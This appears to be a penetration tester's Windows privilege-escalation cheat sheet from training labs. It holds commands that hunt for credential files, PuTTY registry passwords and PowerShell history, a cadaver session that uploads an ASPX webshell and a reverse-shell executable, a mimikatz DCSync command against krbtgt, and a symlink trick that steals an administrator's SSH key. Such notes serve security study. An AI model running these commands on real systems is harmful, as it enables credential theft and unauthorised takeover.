#### Hidden in Plain View

```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

```
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

```
Get-ChildItem -Path . -Include *.txt,*.bak,*.pdf,*.xls,*.xlsx,*.doc,*.docx -Recurse -File -ErrorAction SilentlyContinue -Force
```

```
Get-ChildItem -path c:\ -Force -Recurse -Filter *.git -ErrorAction SilentlyContinue
```
> Only look for .git files

Look for specific string:
```
Select-String -Path C:\temp\*.log -Pattern "Contoso"
```

#### Situational Awareness
```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- 
- Running processes
```

```
systeminfo
```

```
netstat -ano
```

```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

```
get-process
```

```
route print
```

```
ipconfig
```

```
whoami /priv
```


#### Powershell Goldmine

```
Get-History
```

```
(Get-PSReadlineOption).HistorySavePath
```

```
gci -path . -recurse -file -include *transcript*.txt -erroraction SilentlyContinue
```

#### Seatbelt

#### Weak services
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

### Clear text passwords in Registry!

1. Putty
```
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### Scheduled Tasks
```
schtasks /query /fo LIST /v
```

### DLL Hijacking?
```
Use procmond and analyze the binary offline
```


## Cadaver

1. Connect to the webdav server using VALID credentials.
2. Upload a aspx webshell
3. Upload a msfvenom revserse .exe shell
4. Use the aspx webshell to trigger the reverse.exe payload and catch the reverse shell with nc listener.
```
cadaver http://hutch.offsec                          
Authentication required for hutch.offsec on server `hutch.offsec':
Username: fmcsorley
Password: 
dav:/> ls
Listing collection `/': succeeded.
Coll:   aspnet_client                          0  Nov  4  2020
        iisstart.htm                         703  Nov  4  2020
        iisstart.png                       99710  Nov  4  2020
        index.aspx                          1241  Nov  4  2020
dav:/> put 
192.168.209.122.json  comment.cmtx          
dav:/> put cmdasp.aspx 
Uploading cmdasp.aspx to `/cmdasp.aspx':
Progress: [=============================>] 100.0% of 1400 bytes succeeded.
dav:/> ls
Listing collection `/': succeeded.
Coll:   aspnet_client                          0  Nov  4  2020
        cmdasp.aspx                         1400  Nov  1 21:52
        iisstart.htm                         703  Nov  4  2020
        iisstart.png                       99710  Nov  4  2020
        index.aspx                          1241  Nov  4  2020
dav:/> put shell.exe 
Uploading shell.exe to `/shell.exe':
Progress: [=============================>] 100.0% of 7168 bytes succeeded.
dav:/> 
                                                
```

#### mimikatz dcsync

```
> mimikatz lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt
```

#### SeImpersonate


#### phpmyadmin sql client excesive write perms

- Check file write permissions of the MySQL client  in the phpmyadmin to see if we can write into windows/system32. If we can successfully write into system32, we can elevate our perms using the WerTrigger method described here https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#wertrigger --> [https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#wertrigger]  
- ![[Pasted image 20240114193657.png]]
- 
### Find writable paths in windows

```
dir /ad-r 

Parameter "/a" means to displays files with specified attributes. "d" means directory, "r" means read-only and the minus sign means not to show items with this attribute. If you would like to recursive subdirectories, you can add "/s" to the command. 

In PowerShell, you can use the above command too, like: 

cmd /r dir /ad-r
```


### Symbolic Links

In a scenario where you find that a service or any particular script is running as Admin or an elevated user, and it uses or runs any file that you can control or modify, you can try to create a symbolic link that points to another higher priv file.

In this scenario, a backup.ps1 script is run every 60 seconds to create a backup copy of the file `C:\xampp\htdocs\logs\request.log` and saves it into `C:\backup\logs`. 
```
C:\backup>type backup.ps1 
$log = "C:\xampp\htdocs\logs\request.log" 
$backup = "C:\backup\logs"

while($true) {
        # Grabbing Backup
        copy $log $backup\$(get-date -f MM-dd-yyyy_HH_mm_s)
        Start-Sleep -s 60
}
```
We gonna create a `symbolic link` that points from `C:\xampp\htdocs\logs\request.log` to `C:\users\administrator\.ssh\id_rsa` so we can read the ssh private key from the admin, which will be saved in `c:\backup\logs` when the scripts runs.

1. Delete the source file we want to use for redirect 
2. create a symbolic link using the tool from https://github.com/googleprojectzero/symboliclink-testing-tools/releases/download/v1.0/Release.7z 
```
PS C:\windows\tasks> ./CreateSymlink.exe "C:\xampp\htdocs\logs\request.log" "C:\Users\Administrator\.ssh\id_rsa"
Opened Link \RPC Control\request.log -> \??\C:\Users\Administrator\.ssh\id_rsa: 00000154
Press ENTER to exit and delete the symlink
```
> dont click enter and wait for the script to run. Clicking enter will interrupt the symlink
3. After a few minutes, we can visit and read the logs from **C:\backup\logs**.
